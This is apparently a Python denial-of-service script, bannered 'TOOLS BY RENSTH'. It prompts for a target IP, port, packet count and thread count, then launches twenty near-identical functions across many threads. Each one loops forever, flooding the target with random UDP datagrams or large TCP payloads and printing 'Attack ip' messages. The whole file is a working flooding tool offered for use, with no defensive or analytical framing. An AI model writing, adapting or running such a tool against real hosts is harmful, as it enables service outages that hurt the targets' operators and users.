#AUTHOR : Takaa
#SUBSCRIBE : Takaa
import random
import socket
import threading
import os,sys
os.system("clear")
print("""\033[1;31;40m TOOLS BY RENSTH""")

ip = str(input("IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("Do you want to attack?(y/n):"))
times = int(input("PACKET:"))
threads = int(input("ONGKIR:"))
os.system("clear")
def run():
    data = random._urandom(666)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            print("SERVER TURU")
            
def run2():
    data = random._urandom(102400)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")
            
def run3():
    data = random._urandom(102100)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")

def run4():
    data = random._urandom(102400)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")
            
def run5():
    data = random._urandom(66600)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            print("SERVER TURU")
            
def run6():
    data = random._urandom(102400)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")
            
def run7():
    data = random._urandom(102100)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")

def run8():
    data = random._urandom(102400)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")
            
def run9():
    data = random._urandom(66600)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            print("SERVER TURU")
            
def run10():
    data = random._urandom(102400)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")
            
def run11():
    data = random._urandom(102100)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")

def run12():
    data = random._urandom(102400)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")
            
def run13():
    data = random._urandom(66600)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")

def run14():
    data = random._urandom(102400)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")
            
def run15():
    data = random._urandom(102100)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")   
            
def run16():
    data = random._urandom(102400)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")
            
def run17():
    data = random._urandom(66600)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")
            
def run18():
    data = random._urandom(102400)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")
            
def run19():
    data = random._urandom(102100)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")
            
def run20():
    data = random._urandom(102400)
    i = random.choice(("GO ","GO ","GO "))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"\033[0;37;40m Attack ip %s \033[33mport %s"%(ip, port))
        except:
            s.close()
            print("SERVER TURU")            
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
        th = threading.Thread(target = run2)
        th.start()
        th = threading.Thread(target = run3)
        th.start()
        th = threading.Thread(target = run4)
        th.start()
        th = threading.Thread(target = run5)
        th.start()
        th = threading.Thread(target = run6)
        th.start()
        th = threading.Thread(target = run7)
        th.start()
        th = threading.Thread(target = run8)
        th.start()
        th = threading.Thread(target = run9)
        th.start()
        th = threading.Thread(target = run10)
        th.start()
        th = threading.Thread(target = run11)
        th.start()
        th = threading.Thread(target = run12)
        th.start()
        th = threading.Thread(target = run13)
        th.start()
        th = threading.Thread(target = run14)
        th.start()
        th = threading.Thread(target = run15)
        th.start()
        th = threading.Thread(target = run16)
        th.start()
        th = threading.Thread(target = run17)
        th.start()
        th = threading.Thread(target = run18)
        th.start()
        th = threading.Thread(target = run19)
        th.start()
else:
        th = threading.Thread(target = run20)
        th.start()